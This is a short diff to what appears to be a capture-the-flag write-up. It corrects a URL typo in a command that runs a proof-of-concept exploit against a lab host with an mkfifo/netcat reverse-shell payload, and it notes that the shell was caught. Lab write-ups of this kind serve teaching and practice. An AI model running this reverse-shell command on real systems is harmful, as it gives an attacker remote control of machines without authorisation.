@@ -247,7 +247,7 @@ listening on [any] 1337 ...
 {% endhighlight %}
 
 {% highlight bash %}
-$ python poc.py http:/10.10.10.140/index.php/admin "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.XXX.XXX 1337 >/tmp/g"
+$ python poc.py http://10.10.10.140/index.php/admin "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.XXX.XXX 1337 >/tmp/g"
 {% endhighlight %}
 
 As expected, we caught the reverse shell.
